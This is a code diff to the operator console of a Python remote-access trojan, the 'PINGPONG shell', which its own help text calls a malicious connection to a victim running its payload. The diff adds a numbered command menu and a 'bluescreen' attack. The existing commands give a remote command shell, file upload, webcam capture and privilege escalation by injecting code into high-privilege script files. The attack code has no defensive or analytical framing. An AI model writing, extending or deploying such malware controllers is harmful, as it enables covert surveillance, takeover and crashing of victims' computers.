@@ -131,13 +131,50 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
     #请求发送函数：检查连接
     # session_pool = main.get_value('connect_pool')
     # my_id = session_pool.index([conn, my_ip, my_port, ip, port, 'PINGPONG session']) + 1
+    all_usage = ['cmd', 'upload', 'cam_shot', 'priv_vbp_listen', 'background', 'bluescreen']
     import PINGPONG_script.addsend
+    def show_out_usage(list=False, print_out=False):
+        glo = globals()
+        if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn):
+            conn.send(b'OK')
+            amount_of_usage = conn.recv(1024)
+            conn.send(b'OK')
+            i = 0
+            usage_list = []
+            while i < int(amount_of_usage.decode('utf8')):
+                usage = conn.recv(1024)
+                usage_list.append(usage.decode('utf8'))
+                conn.send(b'OK')
+                i += 1
+            if print_out:
+                if list:
+                    main.print_normal(f'''PINGPONG>[*]usage : {usage_list}''')
+                else:
+                    main.print_normal(''' 
+    ---------------------PINGPONG usage---------------------
+    ''')
+            id_count = 0
+            usage_list.append('background')
+            usage_id_dst = {}
+            for _usage in all_usage:
+                if _usage in usage_list:
+                    id_count += 1
+                    usage_id_dst[_usage] = str(id_count)
+                    if print_out:
+                        main.print_good(f'  {id_count}) {_usage}')
+                else:
+                    usage_id_dst[_usage] = None
+            if print_out:
+                main.print_good('   66) help')
+                main.print_good('   99) exit')
+            glo['usage_id_dict'] = usage_id_dst
     while True:
         if Autocommand and g_is_auto and Autocommand != '' and Autocommand != ' ':
             main.print_normal("PINGPONG>[*]running " + Autocommand)
             command = Autocommand
             Autocommand = False
         else:
+            show_out_usage()
             command = input("PINGPONG>")
         #主循环
         # if is_Auto:
@@ -146,7 +183,7 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
         #     print("PINGPONG>[*]running " + AUTOCOMMAND)
         #     command = AUTOCOMMAND
         #     is_Auto = True
-        if command == 'help' or command == 'HELP':
+        if command == 'help' or command == 'HELP' or command == '66':
             main.print_normal("""
 PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
     usage:
@@ -164,14 +201,13 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
             upload : upload your file
             cam_shot : take shot
             priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
-            main.print_warn("PINGPONG>[!]type 'show_usage' to print out all the activate usage")
         elif command == 'backdoor_exe' or command == 'BACKDOOR_EXE':
             pass
-        elif command == 'bg' or command == 'BG':
+        elif command == 'bg' or command == 'BG' or command == usage_id_dict['background']:
             main.print_normal('PINGPONG[*]>backgrounding session......')
             if PINGPONG_script.addsend.App_send('BG_APP', False, conn):
                 main.main()
-        elif command == "cam_shot" or command == "CAM_SHOT":
+        elif command == "cam_shot" or command == "CAM_SHOT" or command == usage_id_dict['cam_shot']:
             import PINGPONG_script.camera
             if PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn):
                 try:
@@ -182,38 +218,29 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
                     cv2.destroyAllWindows()
                 except:
                     print("PINGPONG>[*]Failed to open it, You might not installed open-cv, but it doesn't really important")
-        elif command == "exit" or command == "EXIT":
+        elif command == "exit" or command == "EXIT" or command == '99':
             conn.send(bytes("EXIT_APP", 'utf8'))
             main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
             main.print_normal("handler>[*]Back to main console......")
             connect_pool = main.get_value('connect_pool')
-            connect_pool.remove([conn, my_ip, my_port, ip, port,'PINGPONG session'])
+            connect_pool.remove([conn, my_ip, my_port, ip, int(port),'PINGPONG session'])
             main.set_config('connect_pool', connect_pool)
             conn.close()
             main.main()
             stop_thread(t)
         elif command == " " or command == "":
             continue
-        elif command == "priv_vbp_listen" or command == "PRIV_VBP_LISTEN":
+        elif command == 'bluescreen' or command == 'BLUESCREEN' or command == usage_id_dict['bluescreen']:
+            import PINGPONG_script.bluescreen
+            PINGPONG_script.bluescreen.start_attack(conn, my_ip, my_port, ip, port)
+        elif command == "priv_vbp_listen" or command == "PRIV_VBP_LISTEN" or command == usage_id_dict['priv_vbp_listen']:
             import PINGPONG_script.priv_vbp_listen
             if PINGPONG_script.priv_vbp_listen.priv_vbp_listen(PINGPONG_script.addsend, conn):
                 conn.close()
                 startserver(False, False, ip=ip, port=port)
         elif command == 'show_usage' or command == 'SHOW_USAGE':
-            if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn):
-                conn.send(b'OK')
-                amount_of_usage = conn.recv(1024)
-                conn.send(b'OK')
-                i = 0
-                usage_list = []
-                while i < int(amount_of_usage.decode('utf8')):
-                    usage = conn.recv(1024)
-                    usage_list.append(usage.decode('utf8'))
-                    conn.send(b'OK')
-                    i += 1
-                main.print_normal(f'''PINGPONG>[*]usage : {usage_list}''')
-
-        elif command == "cmd" or command == "CMD":
+            show_out_usage(list=False, print_out=True)
+        elif command == "cmd" or command == "CMD" or command == usage_id_dict['cmd']:
             import PINGPONG_script.cmdshell
             if PINGPONG_script.addsend.App_send("CMDSHELL_APP", True, conn):
                 main.print_good("PINGPONG>[+]GOT IT")
@@ -221,7 +248,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
                 conn.send(bytes(str(cmd_port), "utf8"))
                 conn.recv(1024)
                 PINGPONG_script.cmdshell.start(my_ip, cmd_port, conn, my_port, _main_port=port)
-        elif command == "upload" or command == "UPLOAD":
+        elif command == "upload" or command == "UPLOAD" or command == usage_id_dict['upload']:
             import PINGPONG_script.upload
             if PINGPONG_script.addsend.App_send('UPLOAD_APP', False, conn):
                 file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
